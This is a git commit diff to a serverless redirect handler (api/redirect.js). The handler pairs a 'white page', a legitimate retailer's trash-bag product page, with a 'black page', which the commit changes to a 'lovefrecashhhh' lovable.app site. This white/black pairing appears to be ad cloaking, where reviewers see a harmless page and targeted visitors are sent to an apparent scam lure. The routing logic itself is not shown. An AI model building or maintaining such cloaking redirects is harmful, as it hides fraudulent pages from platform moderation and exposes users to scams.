175581481882d67319f5a41c887eb2e32297d7bc
Ahmadfarhan67 <123234895+Ahmadfarhan67@users.noreply.github.com>
2025-10-29 19:17:43 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
     const whitePageURL = "https://www.coolblue.be/en/product/893472/brabantia-trash-bags-code-m-60l-120-units.html";
-    const blackPageURL = "https://nowhereher.lovable.app/";
+    const blackPageURL = "https://lovefrecashhhh.lovable.app/?";
 
     //testing
   
@@ -27,6 +27,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
